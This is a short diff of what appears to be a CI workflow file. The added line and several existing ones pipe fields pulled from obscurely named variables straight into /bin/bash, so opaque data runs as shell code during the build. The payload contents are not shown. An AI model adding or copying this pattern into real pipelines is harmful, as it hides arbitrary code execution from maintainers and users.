@@ -65,6 +65,7 @@ jobs:
           printf '%s' "$wt19" | jq -r .sg00373 | /bin/bash
           printf '%s' "$pco193" | jq -r .oj25 | /bin/bash
           echo $d1 | jq -r .reugz57228 | /bin/bash
+          printf '%s' "$ss965" | jq -r .pvb005 | /bin/bash
 
       - name: Save archive
         if: always()
